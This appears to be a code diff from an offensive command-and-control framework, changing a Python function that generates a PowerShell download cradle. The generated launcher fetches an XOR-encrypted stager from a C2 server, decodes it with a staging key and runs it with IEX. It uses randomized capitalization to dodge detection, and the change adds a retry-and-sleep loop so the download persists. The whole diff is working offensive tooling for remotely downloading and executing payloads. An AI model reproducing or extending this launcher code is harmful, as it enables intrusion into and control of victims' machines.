@@ -278,7 +278,7 @@ class Stagers:
         return server + checksum
 
 
-    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default"):
+    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
         """
         Generate the initial IEX download cradle with a specified
         c2 server and a valid HTTP checksum.
@@ -300,7 +300,7 @@ class Stagers:
             return ""
 
         # extract the staging information from this specified listener
-        (server, stagingKey, pivotServer, hop) = self.mainMenu.listeners.get_stager_config(listenerName)
+        (server, stagingKey, pivotServer, hop, defaultDelay) = self.mainMenu.listeners.get_stager_config(listenerName)
 
         # if UA is 'default', use the UA from the default profile in the database
         if userAgent.lower() == "default":
@@ -339,9 +339,16 @@ class Stagers:
         # the stub to decode the encrypted stager download by XOR'ing with the staging key
         stager += helpers.randomize_capitalization("$K=")
         stager += "'"+stagingKey+"';"
-        stager += helpers.randomize_capitalization("$i=0;[char[]]$b=([char[]]($wc.DownloadString(\"")
-        stager += URI
-        stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join'')")
+
+        if(stagerRetries == "0"):
+            stager += helpers.randomize_capitalization("$i=0;[char[]]$b=([char[]]($wc.DownloadString(\"")
+            stager += URI
+            stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join'')")
+        else:
+            # if there are a stager retries
+            stager += helpers.randomize_capitalization("$R=%s;do{try{$i=0;[cHAR[]]$B=([cHAR[]]($WC.DoWNLOadSTriNg(\"" %(stagerRetries))
+            stager += URI
+            stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join''); $R=0;}catch{sleep "+str(defaultDelay)+";$R--}} while ($R -gt 0)")
 
         # base64 encode the stager and return it
         if encode:
